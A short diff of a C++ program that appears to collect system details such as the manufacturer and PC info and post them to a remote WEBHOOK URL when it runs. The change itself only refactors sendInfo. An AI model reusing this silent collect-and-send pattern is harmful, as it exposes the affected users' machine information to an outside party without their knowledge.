@@ -36,12 +36,10 @@ bool isNetPresent()
 	return false;
 }
 
-void sendInfo(std::string content)
+void sendInfo(const std::string& content)
 {
 	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK }, cpr::Payload{ { "content", content } });
 }
-
-
 
 std::string getSysManu()
 {
@@ -108,5 +106,4 @@ int main()
 	sendInfo(jsonPCInfo());
 	
 	return 0;
-
 }
